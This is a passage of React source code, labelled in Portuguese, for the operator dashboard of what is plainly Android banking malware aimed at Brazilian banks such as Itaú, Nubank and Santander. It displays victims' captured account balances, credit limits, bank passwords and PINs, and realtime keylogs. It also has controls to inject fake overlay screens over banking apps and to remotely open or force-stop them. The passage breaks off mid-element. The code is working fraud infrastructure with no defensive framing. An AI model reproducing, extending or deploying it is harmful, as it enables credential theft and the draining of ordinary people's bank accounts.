                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#ef4444] bg-[#121214]/70 border border-[#2a2a31]/30 px-1.5 py-0.5 rounded-md shadow-sm" title={`Último Acesso: ${lastAccessInfo.fullLabel}`}>
                                    <Clock className="w-2.5 h-2.5 text-[#ef4444]" />
                                    <span className="text-slate-400 uppercase text-[7px]">ACESSO:</span>
                                    <span className="font-bold text-[#e8e8ea]">{lastAccessInfo.formattedRelative}</span>
                                  </span>
                                ) : (
                                  <span className="inline-flex items-center gap-1 text-[8px] font-mono text-[#8b8b94] bg-[#121214]/60 border border-[#24242a] px-1.5 py-0.5 rounded-md">
                                    <Clock className="w-2.5 h-2.5 text-[#6f6f78]" />
                                    Sem dados
                                  </span>
                                )}
                              </div>
                            </div>
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>

                {/* Lateral Direita - Detalhes do Banco Selecionado */}
                <div className="flex-1 flex flex-col overflow-hidden bg-[#200603]">
                  {selectedMonitorBank ? (() => {
                    const app = selectedMonitorBank;
                    const appPasswords = bankPasswords.filter(pwd => {
                      if (!app) return true;
                      const pPkg = (pwd.package || '').toLowerCase();
                      const aPkg = (app.package || '').toLowerCase();
                      const pBank = (pwd.bank || '').toLowerCase();
                      const aName = (app.name || '').toLowerCase();
                      
                      if (pPkg && aPkg && (pPkg === aPkg || pPkg.includes(aPkg) || aPkg.includes(pPkg))) return true;
                      if (pBank && aName && (pBank.includes(aName) || aName.includes(pBank))) return true;
                      
                      const keywords = ['itau', 'bradesco', 'santander', 'nubank', 'bb', 'caixa', 'inter', 'c6', 'safra', 'sicoob', 'sicredi', 'btg', 'mercadopago', 'pagbank', 'will', 'pan'];
                      for (const kw of keywords) {
                        if ((pPkg.includes(kw) || pBank.includes(kw)) && (aPkg.includes(kw) || aName.includes(kw))) {
                          return true;
                        }
                      }
                      return false;
                    });
                    const appKeylogs = bankKeylogs;
                    
                    return (
                      <div className="flex-1 flex flex-col overflow-hidden p-4">
                        {/* Header do Banco Selecionado */}
                        <div className="flex items-center justify-between pb-3 border-b border-[#2a2a31]/10 flex-shrink-0">
                          <div className="flex items-center space-x-3">
                            <BankIcon pkg={app.package} iconB64={app.icon || app.iconB64 || app.icon_base64} name={app.name} size={42} />
                            <div>
                              <h2 className="text-lg font-black text-white">{app.name}</h2>
                              <p className="text-xs text-[#8b8b94] font-mono">{app.package}</p>
                            </div>
                          </div>
                          <div className="flex items-center space-x-2">
                            <button
                              onClick={() => openApp(app.package, app.name)}
                              className="px-3 py-1.5 bg-gradient-to-r from-[#ef4444] to-[#ef4444] hover:from-[#ef4444] hover:to-[#f87171] text-[#10120a] text-xs font-bold rounded-md transition-all shadow-[0_0_10px_rgba(239,68,68,0.3)]"
                            >
                               Abrir App
                            </button>
                            <button
                              onClick={() => forceStopApp(app.package, app.name)}
                              className="px-3 py-1.5 bg-red-655 hover:bg-red-655/80 text-white text-xs font-bold rounded-md transition-all"
                            >
                               Forçar Parada
                            </button>
                          </div>
                        </div>

                        {/* Auto-Gatilho de Overlay para este App */}
                        {(() => {
                          const currentMapping = overlayMappings.find(m => m.package_name === app.package);
                          return (
                            <div className="p-3 bg-purple-950/20 border border-[#f87171]/20 rounded-md flex items-center justify-between flex-shrink-0 text-xs">
                              <div className="flex items-center space-x-2">
                                <span className="text-[10px] text-[#f87171] font-bold uppercase tracking-wider"> Auto-Gatilho de Tela:</span>
                                <select
                                  value={currentMapping ? `${currentMapping.project_id}|${currentMapping.screen_id}` : ''}
                                  onChange={(e) => {
                                    const val = e.target.value;
                                    if (!val) {
                                      if (currentMapping) {
                                        deleteOverlayMapping(currentMapping.id);
                                      }
                                    } else {
                                      const [pId, sId] = val.split("|");
                                      const savedProjectsStr = localStorage.getItem('apkStudioProjects');
                                      const localProjects = savedProjectsStr ? JSON.parse(savedProjectsStr) : [];
                                      const projectsToUse = [PRESET_BANK_PROJECT, ...localProjects];
                                      const proj = projectsToUse.find((p: any) => p.id === pId);
                                      if (proj) {
                                        const sIdx = proj.screens.findIndex((s: any) => s.id === sId);
                                        if (sIdx !== -1) {
                                          addOverlayMapping(app.package, pId, sIdx);
                                        }
                                      }
                                    }
                                  }}
                                  className="bg-black/60 border border-[#2a2a31]/20 text-white rounded px-2 py-1 focus:outline-none focus:border-[#f87171]"
                                >
                                  <option value="">-- Sem Overlay Automática --</option>
                                  {projects.map((p: any) => 
                                    p.screens.map((s: any) => (
                                      <option key={`${p.id}|${s.id}`} value={`${p.id}|${s.id}`}>
                                        {p.name} - {s.name}
                                      </option>
                                    ))
                                  )}
                                </select>
                              </div>
                              {currentMapping && (
                                <button
                                  type="button"
                                  onClick={() => applyCustomBlackScreen(currentMapping.template)}
                                  className="px-2 py-1 bg-[#84cc16] hover:bg-purple-700 text-white font-bold rounded text-[10px]"
                                  title="Testar injeção imediatamente"
                                >
                                  Injetar Agora
                                </button>
                              )}
                            </div>
                          );
                        })()}

                        {/* Conteúdo Dinmico com Scroll */}
                        <div className="flex-1 overflow-y-auto py-4 space-y-4 pr-1">
                          
                          {/* ³ SALDO BANCRIO CAPTURADO */}
                          {(() => {
                            const allBals = bankBalances.filter((b: any) => b.package === app.package);
                            const newest = allBals[0];
                            const cardGradient = getBankCardGradient(app.package);
                            const logo = getBankLogoEmoji(app.package);
                            
                            return (
                              <div className="space-y-4">
                                {/*  CARTO DE SALDO PREMIUM (GLASSMORPHISM) */}
                                <div className={`relative overflow-hidden rounded-md bg-gradient-to-br ${cardGradient} border p-5 shadow-2xl transition-all duration-300 hover:shadow-[0_0_20px_rgba(255,255,255,0.05)]`}>
                                  {/* Gloss light reflection */}
                                  <div className="absolute top-0 right-0 w-32 h-32 bg-white/5 rounded-full blur-2xl pointer-events-none -mr-8 -mt-8"></div>
                                  
                                  <div className="flex justify-between items-start mb-6">
                                    <div className="flex items-center space-x-2">
                                      <span className="text-3xl">{logo}</span>
                                      <div>
                                        <h3 className="text-xs font-black uppercase text-white/80 tracking-widest">MONITOR DE SALDO</h3>
                                        <p className="text-[9px] text-white/60 font-mono tracking-wider">{app.package}</p>
                                      </div>
                                    </div>
                                    <span className="px-2 py-0.5 bg-black/40 border border-white/10 text-white/90 text-[8px] font-mono rounded">
                                      {newest ? (newest.source === "screen_hierarchy_auto" ? "AUTO-READ V2" : "EXPLICIT") : "WAITING"}
                                    </span>
                                  </div>

                                  {newest ? (
                                    <div className="space-y-4">
                                      <div className="flex items-end justify-between">
                                        <div>
                                          <p className="text-[9px] text-white/60 uppercase tracking-widest mb-1">Saldo Disponível</p>
                                          <div className="flex items-baseline space-x-2">
                                            <span className="text-3xl font-black font-mono text-white tracking-wider drop-shadow-[0_2px_4px_rgba(0,0,0,0.5)]">
                                              {newest.balance}
                                            </span>
                                          </div>
                                        </div>
                                        
                                        <button
                                          onClick={() => {
                                            navigator.clipboard.writeText(newest.balance);
                                            addLog(` Saldo copiado: ${newest.balance}`);
                                          }}
                                          className="px-2.5 py-1.5 bg-white/10 hover:bg-white/20 text-white border border-white/10 text-[10px] font-bold rounded-md transition-all flex items-center gap-1"
                                        >
                                          Copiar
                                        </button>
                                      </div>

                                      {/* Sub-grid para Limite e Fatura se existirem */}
                                      {(newest.credit_limit || newest.invoice) && (
                                        <div className="grid grid-cols-2 gap-2 pt-2 border-t border-white/10">
                                          {newest.credit_limit && (
                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Limite Crédito</p>
                                              <div className="flex items-center justify-between">
                                                <span className="text-xs font-mono font-black text-emerald-400">{newest.credit_limit}</span>
                                                <button
                                                  onClick={(e) => {
                                                    e.stopPropagation();
                                                    navigator.clipboard.writeText(newest.credit_limit);
                                                    addLog(` Limite de crédito copiado: ${newest.credit_limit}`);
                                                  }}
                                                  className="text-[9px] hover:text-emerald-300 font-bold font-sans text-white/40 ml-1 hover:underline"
                                                >
                                                  Copiar
                                                </button>
                                              </div>
                                            </div>
                                          )}
                                          {newest.invoice && (
                                            <div className="bg-black/30 rounded-md p-2 border border-white/5">
                                              <p className="text-[8px] text-white/50 uppercase tracking-wider mb-0.5"> Fatura Atual</p>
                                              <div className="flex items-center justify-between">
                                                <span className="text-xs font-mono font-black text-[#f87171]">{newest.invoice}</span>
                                                <button
                                                  onClick={(e) => {
                                                    e.stopPropagation();
                                                    navigator.clipboard.writeText(newest.invoice);
                                                    addLog(` Fatura copiada: ${newest.invoice}`);
                                                  }}
                                                  className="text-[9px] hover:text-[#fca5a5] font-bold font-sans text-white/40 ml-1 hover:underline"
                                                >
                                                  Copiar
                                                </button>
                                              </div>
                                            </div>
                                          )}
                                        </div>
                                      )}

                                      <div className="pt-2 border-t border-white/10 flex justify-between items-center text-[9px] text-white/60 font-mono">
                                        <span>ÚLTIMA ATUALIZAÇO</span>
                                        <span>{new Date(newest.timestamp).toLocaleString('pt-BR')}</span>
                                      </div>
                                    </div>
                                  ) : (
                                    <div className="text-center py-8 bg-black/30 rounded-md border border-dashed border-white/10">
                                      <span className="text-3xl block mb-2 animate-pulse"></span>
                                      <p className="font-bold text-white text-xs mb-1">Aguardando captura automática</p>
                                      <p className="text-[10px] text-white/40 max-w-[200px] mx-auto">
                                        O saldo será capturado automaticamente assim que a tela inicial deste banco for aberta no dispositivo.
                                      </p>
                                    </div>
                                  )}
                                </div>

                                {/*  HISTÓRICO DE CAPTURAS */}
                                {allBals.length > 1 && (
                                  <div className="bg-gradient-to-br from-[#121214]/60 to-slate-950/80 border border-[#24242a] rounded-md p-4">
                                    <h4 className="text-xs font-bold text-slate-400 uppercase tracking-wider mb-2 flex items-center justify-between">
                                      <span>Histórico de Alterações</span>
                                      <span className="text-[10px] text-[#6f6f78] normal-case font-normal">{allBals.length} registros</span>
                                    </h4>
                                    <div className="space-y-1.5 max-h-36 overflow-y-auto pr-1">
                                      {allBals.slice(1).map((b: any, i: number) => (
                                        <div key={i} className="flex items-center justify-between bg-black/20 rounded-md px-3 py-2 border border-[#121214] hover:border-[#24242a] transition-colors">
                                          <span className="font-mono text-xs text-slate-300 font-bold">{b.balance}</span>
                                          <span className="text-[9px] text-[#8b8b94] font-mono">
                                            {new Date(b.timestamp).toLocaleString('pt-BR')}
                                          </span>
                                        </div>
                                      ))}
                                    </div>
                                  </div>
                                )}
                              </div>
                            );
                          })()}

                          {/*  SENHAS DE ACESSO CAPTURADAS */}
                          <div className="bg-gradient-to-br from-orange-950/40 via-amber-950/20 to-[#121214]/80 rounded-md p-4 border border-[#ef4444]/30 shadow-xl">
                            <div className="flex items-center justify-between mb-3">
                              <h3 className="text-xs font-black uppercase text-[#f87171] tracking-wider flex items-center gap-2">
                                <span className="text-sm"></span>
                                Senhas de Acesso Capturadas ({appPasswords.length})
                              </h3>
                              {appPasswords.length > 0 && (
                                <button
                                  onClick={() => {
                                    const allText = appPasswords.map(p => `[${p.bank || app.name}] ${p.label || p.hint || 'SENHA'}: ${p.password}`).join('\n');
                                    navigator.clipboard.writeText(allText);
                                    addLog(` Copiadas ${appPasswords.length} senhas de ${app.name}`);
                                  }}
                                  className="text-[9px] bg-orange-950/80 hover:bg-[#1a1a1e] text-[#fca5a5] font-bold px-2 py-1 rounded border border-[#ef4444]/30 transition-all font-mono"
                                >
                                  Copiar Todas
                                </button>
                              )}
                            </div>
                            
                            {appPasswords.length === 0 ? (
                              <div className="text-center py-6 text-[#8b8b94] text-xs bg-black/30 rounded-md border border-[#121214] flex flex-col items-center justify-center gap-1">
                                <span className="text-2xl"></span>
                                <span>Nenhuma senha capturada para este app ainda.</span>
                                <span className="text-[10px] text-[#6f6f78]">As senhas serão salvas automaticamente quando digitadas.</span>
                              </div>
                            ) : (
                              <div className="space-y-3">
                                {appPasswords.map((pwd, i) => (
                                  <div key={i} className="bg-slate-950/80 border border-[#ef4444]/40 rounded-md p-3 shadow-lg hover:border-[#f87171]/60 transition-all">
                                    <div className="flex items-center justify-between mb-2">
                                      <div className="flex items-center space-x-2">
                                        <span className="px-2 py-0.5 bg-[#1a1a1e]/80 text-orange-200 text-[10px] rounded font-mono font-bold border border-[#84cc16]/30">
                                          {pwd.label || pwd.hint || 'SENHA'}
                                        </span>
                                        {pwd.digits && (
                                          <span className="px-1.5 py-0.5 bg-[#121214] text-slate-400 text-[9px] rounded font-mono">
                                            {pwd.digits} dígitos
                                          </span>
                                        )}
                                        {pwd.source === 'VISUAL_SCREEN' && (
                                          <span className="px-1.5 py-0.5 bg-green-950 text-green-400 text-[9px] rounded border border-green-800/40 font-mono">
                                             Visual Overlay
                                          </span>
                                        )}
                                        {pwd.source === 'LOCKSCREEN' && (
                                          <span className="px-1.5 py-0.5 bg-purple-950 text-[#f87171] text-[9px] rounded border border-purple-800/40 font-mono">
                                             Lockscreen
                                          </span>
                                        )}
                                      </div>
                                      <span className="text-[10px] text-[#8b8b94] font-mono">
                                        {new Date(pwd.timestamp).toLocaleTimeString('pt-BR')}
                                      </span>
                                    </div>
                                    <div className="flex items-center justify-between bg-black/70 rounded-md p-2 border border-[#121214]">
                                      <span className="text-xl font-bold font-mono text-emerald-400 tracking-[0.2em] px-2 flex-1 text-center select-all">
                                        {pwd.password}
                                      </span>
                                      <button
                                        onClick={() => {
                                          navigator.clipboard.writeText(pwd.password);
                                          addLog(` Senha copiada: ${pwd.password}`);
                                        }}
                                        className="px-3 py-1.5 bg-[#84cc16] hover:bg-[#ef4444] text-white text-xs font-bold rounded-md transition-colors shadow-md flex items-center gap-1"
                                      >
                                        Copiar
                                      </button>
                                    </div>
                                  </div>
                                ))}
                              </div>
                            )}
                          </div>

{/* ¨ KEYLOGS DENTRO DO BANCO */}
                          <div className="bg-gradient-to-br from-[#121214] to-slate-950/60 rounded-md p-4 border border-[#24242a]/80 shadow-2xl relative overflow-hidden">
                            {/* Efeito de brilho neon no fundo */}
                            <div className="absolute top-0 right-0 w-24 h-24 bg-[#ef4444]/5 blur-3xl rounded-full pointer-events-none"></div>
                            
                            <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 mb-4">
                              <div>
                                <h3 className="text-xs font-black uppercase text-slate-300 tracking-wider flex items-center gap-2">
                                  <span className="relative flex h-2 w-2">
                                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#ef4444] opacity-75"></span>
                                    <span className="relative inline-flex rounded-full h-2 w-2 bg-[#ef4444]"></span>
                                  </span>
                                  ¨ Teclas Digitadas neste App ({appKeylogs.length})
                                </h3>
                                <p className="text-[10px] text-slate-505 mt-0.5">Captura em tempo real para {app.name}</p>
                              </div>
                              
                              {/* Campo de Busca Inovador */}
                              <div className="relative w-full md:w-48 flex-shrink-0">
                                <input
                                  type="text"
                                  placeholder="Buscar nas teclas..."
                                  value={bankKeylogSearch}
                                  onChange={(e) => setBankKeylogSearch(e.target.value)}
                                  className="w-full text-xs bg-slate-950/85 border border-[#24242a] rounded-md px-2.5 py-1.5 pl-7 text-slate-200 placeholder-[#6f6f78] focus:outline-none focus:border-[#2a2a31]/50 transition-all font-mono"
                                />
                                <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[#6f6f78] text-xs"></span>
                              </div>
                            </div>

                            {/* Mini Stats Banner */}
                            {appKeylogs.length > 0 && (
                              <div className="grid grid-cols-2 gap-2 mb-4 bg-slate-950/30 p-2 rounded-md border border-[#121214]/50">
                                <div className="text-center border-r border-[#121214]">
                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Total de Logs</span>
                                  <span className="text-xs font-bold text-[#ef4444] font-mono">{appKeylogs.length}</span>
                                </div>
                                <div className="text-center">
                                  <span className="block text-[9px] text-[#8b8b94] font-bold uppercase tracking-wider">Última Atividade</span>
                                  <span className="text-xs font-bold text-green-400 font-mono">
                                    {(() => {
                                      const lastLog = [...appKeylogs].sort((a, b) => 
                                        new Date(b.timestamp || b.created_at).getTime() - new Date(a.timestamp || a.created_at).getTime()
                                      )[0];
                                      if (!lastLog) return "N/A";
                                      return new Date(lastLog.timestamp || lastLog.created_at).toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
                                    })()}
                                  </span>
                                </div>
                              </div>
                            )}

                            {appKeylogs.length === 0 ? (
                              isLoadingBankKeylogs ? (
                                <div className="text-center py-8 text-slate-400 text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                  <span className="animate-spin text-2xl">³</span>
                                  <span>Carregando teclas do banco...</span>
                                </div>
                              ) : (
                                <div className="text-center py-8 text-[#8b8b94] text-xs bg-slate-950/40 rounded-md border border-[#121214]/50 flex flex-col items-center justify-center gap-2">
                                  <span className="text-2xl"></span>
                                  <span>Nenhuma tecla capturada dentro do app ainda.</span>
                                </div>
                              )
                            ) : (
                              (() => {
                                const isGenericLayoutClass = (cls: string) => {
                                  if (!cls) return false;
                                  const lower = cls.toLowerCase();
                                  return (
                                    lower.startsWith('android.widget.') ||
                                    lower.startsWith('android.view.') ||
                                    lower.startsWith('android.graphics.') ||
                                    lower.startsWith('android.inputmethod') ||
                                    /^[a-z0-9]\.[a-z0-9_]+$/i.test(cls) ||
                                    lower.includes('framelayout') ||
                                    lower.includes('imageview') ||
                                    lower.includes('linearlayout') ||
                                    lower.includes('relativelayout') ||
                                    lower.includes('viewgroup')
                                  );
                                };

                                const getBankLogDisplay = (l: any) => {
                                  const textVal = (typeof l.text === 'string' ? l.text : typeof l.data === 'string' ? l.data : '').trim();
                                  const eventType = l.eventType || l.event_type || l.type || '';
                                  const hint = l.hint || '';
                                  const fieldName = l.fieldName || l.field_name || '';

                                  // 1. Evento de Clique em Botão do Banco ou Toque em Tela
                                  if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || eventType === 'VIEW_CLICKED') {
                                    if (textVal && !textVal.startsWith('[CLICK:') && !textVal.startsWith('[BTN:')) {
                                      const cleanText = textVal.replace(/^"|"$/g, '');
                                      return ` Botão Clicado: "${cleanText}"`;
                                    } else if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                      const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                      const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
                                      return ` Toque em Elemento da Tela${posInfo}`;
                                    }
                                    return ` Clique / Toque no Banco`;
                                  }

                                  // 2. Dígito ou PIN de Senha Bancária
                                  if (
                                    eventType === 'BANK_DIGIT_REALTIME' || 
                                    eventType === 'BANK_PASSWORD_COMPLETE' || 
                                    eventType === 'SANTANDER_KEYPAD' || 
                                    eventType === 'LOCKSCREEN_PIN' || 
                                    eventType === 'BANK_PASSWORD_DIGIT_REAL' ||
                                    eventType === 'BANK_PASSWORD_MASKED_COUNT' ||
                                    (l.isPassword && (eventType.includes('PIN') || eventType.includes('PASSWORD') || eventType.includes('KEYPAD')))
                                  ) {
                                    const cleanNum = textVal.replace(/[\[\]]/g, '');
                                    if (eventType === 'BANK_PASSWORD_COMPLETE') {
                                      return ` Senha Compilada: [ ${cleanNum} ]`;
                                    }
                                    return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                  }

                                  // 3. Posição de toque na tela por texto
                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:')) {
                                    const posMatch = textVal.match(/pos\((\d+),(\d+)\)/);
                                    const posInfo = posMatch ? ` (x:${posMatch[1]}, y:${posMatch[2]})` : '';
                                    return ` Toque na Tela${posInfo}`;
                                  }

                                  // 4. Se for número isolado (ex: 86, 8, [86], [8])
                                  if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                    const cleanNum = textVal.replace(/[\[\]]/g, '');
                                    if (l.isPassword) {
                                      return ` Teclado / Dígito: [ ${cleanNum} ]`;
                                    }
                                    return ` Botão / Dígito Clicado: [ ${cleanNum} ]`;
                                  }

                                  // 5. Alteração / Digitação de Texto
                                  if (eventType === 'TEXT_CHANGED' || eventType === 'INPUT_TEXT') {
                                    if (hint && textVal) {
                                      return `¨ Texto (${hint}): "${textVal}"`;
                                    }
                                    return `¨ Texto Digitado: "${textVal}"`;
                                  }

                                  // 6. Mudança de Tela
                                  if (eventType.startsWith('WINDOW_CHANGED:')) {
                                    const screenName = eventType.replace('WINDOW_CHANGED:', '').trim();
                                    if (isGenericLayoutClass(screenName)) {
                                      return ` Navegação no App`;
                                    }
                                    return ` Tela Aberta: ${screenName || 'Navegação em App'}`;
                                  }
                                  if (textVal.startsWith('Tela Aberta:')) {
                                    const sName = textVal.replace('Tela Aberta:', '').trim();
                                    if (isGenericLayoutClass(sName)) {
                                      return ` Navegação no App`;
                                    }
                                    return ` ${textVal}`;
                                  }

                                  // 7. Texto normal
                                  if (textVal && textVal !== '""' && textVal !== 'null') {
                                    return textVal;
                                  }

                                  // 8. Contexto / Hint
                                  if (hint && fieldName) {
                                    return `· [${fieldName}] ${hint}`;
                                  } else if (hint) {
                                    return ` Contexto: ${hint}`;
                                  } else if (fieldName) {
                                    return ` Campo focado: ${fieldName}`;
                                  }

                                  return ` Interação no Banco`;
                                };

                                const getLogCategory = (l: any) => {
                                  const textVal = (typeof l.text === 'string' ? l.text : typeof l.data === 'string' ? l.data : '').trim();
                                  const eventType = l.eventType || l.event_type || l.type || '';

                                  // Eventos de clique em botão são SEMPRE 'click'
                                  if (eventType === 'BANK_BUTTON_CLICK' || eventType === 'BANK_CLICK_POSITION' || (eventType === 'VIEW_CLICKED' && !l.isPassword)) {
                                    return 'click';
                                  }

                                  // Eventos de senha/PIN/dígito
                                  if (
                                    eventType === 'BANK_DIGIT_REALTIME' || 
                                    eventType === 'BANK_PASSWORD_COMPLETE' || 
                                    eventType === 'SANTANDER_KEYPAD' || 
                                    eventType === 'LOCKSCREEN_PIN' || 
                                    eventType === 'BANK_PASSWORD_DIGIT_REAL' ||
                                    eventType === 'BANK_PASSWORD_MASKED_COUNT' ||
                                    (l.isPassword && !eventType.includes('BUTTON') && !eventType.includes('CLICK'))
                                  ) {
                                    return 'password';
                                  }

                                  // Cliques por texto ou posição
                                  if (textVal.startsWith('[CLICK:') || textVal.startsWith('[BTN:') || textVal.startsWith('') || eventType.includes('CLICK')) {
                                    return 'click';
                                  }

                                  // Telas
                                  if (eventType.startsWith('WINDOW_CHANGED:') || eventType === 'WINDOW_STATE_CHANGED' || textVal.startsWith('Tela Aberta:')) {
                                    const screenName = eventType.replace('WINDOW_CHANGED:', '').replace('Tela Aberta:', '').trim();
                                    if (isGenericLayoutClass(screenName)) {
                                      return 'layout_noise';
                                    }
                                    return 'screen';
                                  }

                                  // Números
                                  if (/^\[?\d{1,8}\]?$/.test(textVal)) {
                                    if (l.isPassword) return 'password';
                                    return 'click';
                                  }

                                  if (eventType === 'TEXT_CHANGED' || eventType === 'INPUT_TEXT') {
                                    return 'text';
                                  }

                                  if (textVal) {
                                    return 'text';
                                  }
                                  return 'other';
                                };

                                // Filtra logs pela busca e categoria
                                const filteredLogs = appKeylogs.filter(log => {
                                  const cat = getLogCategory(log);
                                  // Ignora ruído de layout genérico do Android (FrameLayout, ImageView, o.hpp) para não poluir os logs
                                  if (cat === 'layout_noise') return false;

                                  if (bankLogCategoryFilter !== 'all' && cat !== bankLogCategoryFilter) {
                                    return false;
                                  }
                                  const display = getBankLogDisplay(log).toLowerCase();
                                  const eventType = (log.eventType || '').toLowerCase();
                                  const hint = (log.hint || '').toLowerCase();
                                  const fieldName = (log.fieldName || '').toLowerCase();
                                  const search = bankKeylogSearch.toLowerCase();
                                  return display.includes(search) || eventType.includes(search) || hint.includes(search) || fieldName.includes(search);
                                });

                                if (filteredLogs.length === 0) {
                                  return (
                                    <div className="space-y-3">
                                      {/* Bar de Filtros por Categoria */}
                                      <div className="flex items-center gap-1.5 overflow-x-auto pb-1 custom-scrollbar">
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('all')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'all'
                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                          Œ Todos ({appKeylogs.length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('password')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'password'
                                              ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Senhas ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('click')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'click'
                                              ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Botões ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                        </button>
                                        <button
                                          type="button"
                                          onClick={() => setBankLogCategoryFilter('screen')}
                                          className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                            bankLogCategoryFilter === 'screen'
                                              ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                              : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                          }`}
                                        >
                                           Telas ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                        </button>
                                      </div>
                                      <div className="text-center py-6 text-[#6f6f78] text-xs font-mono">
                                        Nenhum resultado para os filtros selecionados
                                      </div>
                                    </div>
                                  );
                                }

                                const groups: { [key: string]: any[] } = {};
                                const sortedLogs = [...filteredLogs].sort((a, b) => 
                                  new Date(b.timestamp || b.created_at).getTime() - new Date(a.timestamp || a.created_at).getTime()
                                );

                                sortedLogs.forEach(log => {
                                  const logDate = new Date(log.timestamp || log.created_at);
                                  const todayStr = new Date().toDateString();
                                  const yesterdayStr = new Date(Date.now() - 86400000).toDateString();
                                  
                                  let dayLabel = "";
                                  if (logDate.toDateString() === todayStr) {
                                    dayLabel = "Hoje";
                                  } else if (logDate.toDateString() === yesterdayStr) {
                                    dayLabel = "Ontem";
                                  } else {
                                    dayLabel = logDate.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit', year: 'numeric' });
                                  }
                                  
                                  if (!groups[dayLabel]) {
                                    groups[dayLabel] = [];
                                  }
                                  groups[dayLabel].push(log);
                                });

                                return (
                                  <div className="space-y-3">
                                    {/* Bar de Filtros por Categoria */}
                                    <div className="flex items-center gap-1.5 overflow-x-auto pb-1 custom-scrollbar">
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('all')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'all'
                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                        Œ Todos ({appKeylogs.length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('password')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'password'
                                            ? 'bg-[#ef4444]/20 text-rose-300 border-[#ef4444]/50 shadow-[0_0_8px_rgba(244,63,94,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Senhas & Dígitos ({appKeylogs.filter(l => getLogCategory(l) === 'password').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('click')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'click'
                                            ? 'bg-[#f87171]/20 text-[#fca5a5] border-[#f87171]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Botões & Cliques ({appKeylogs.filter(l => getLogCategory(l) === 'click').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('screen')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'screen'
                                            ? 'bg-[#ef4444]/20 text-[#ef4444] border-[#2a2a31]/50 shadow-[0_0_8px_rgba(239,68,68,0.3)]'
                                            : 'bg-slate-950/60 text-slate-400 border-[#121214] hover:text-slate-200'
                                        }`}
                                      >
                                         Telas Aberta ({appKeylogs.filter(l => getLogCategory(l) === 'screen').length})
                                      </button>
                                      <button
                                        type="button"
                                        onClick={() => setBankLogCategoryFilter('text')}
                                        className={`px-2.5 py-1 rounded-md text-[10px] font-bold transition-all flex items-center gap-1 font-mono border flex-shrink-0 ${
                                          bankLogCategoryFilter === 'text'
